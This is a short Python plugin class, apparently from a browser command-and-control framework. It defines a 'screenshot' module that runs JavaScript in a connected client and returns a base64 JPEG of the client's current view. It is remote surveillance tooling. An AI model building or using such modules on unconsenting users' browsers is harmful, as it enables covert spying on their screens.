from c2.plugins.internal.plugins import BasePlugin


class ScreenshotPlugin(BasePlugin):
    name = "screenshot"
    js_file = "screenshot.js"

    async def capture(self, scale: float = 0.5) -> str:
        """Captures a screenshot of the current client view and returns it as a base64 JPEG.

        :param scale: Resolution scale factor (0.1–1.0). Lower values produce smaller images.
        :type scale: float
        :return: Base64-encoded JPEG as a data URL (data:image/jpeg;base64,...)
        :rtype: str
        """
        return await self.methods.eval_js(f'return window.takeScreenshot({scale});')
